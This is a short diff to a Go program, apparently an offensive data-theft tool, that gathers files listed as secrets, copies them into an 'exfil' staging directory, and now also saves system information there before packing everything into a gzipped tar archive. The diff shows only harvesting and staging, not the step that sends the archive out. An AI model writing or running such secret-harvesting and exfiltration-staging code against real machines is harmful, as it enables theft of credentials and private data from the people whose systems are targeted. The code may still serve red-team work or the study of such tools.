@@ -15,7 +15,14 @@ func main() {
 	accessibleFiles := internals.FilterExistingFiles(secrets)
 	internals.CopyFiles(accessibleFiles, exfilDirectory)
 
-	err := internals.TarGzipDirectory(exfilDirectory)
+	systemInfo, err := internals.SaveSystemInfo(exfilDirectory)
+	if err != nil {
+		fmt.Println(err)
+	} else {
+		fmt.Println("[+] SystemInfo saved:", systemInfo)
+	}
+
+	err = internals.TarGzipDirectory(exfilDirectory)
 	if err != nil {
 		fmt.Println("[!] Error creating archive of:", exfilDirectory)
 		fmt.Println("\tError Returned:", err)
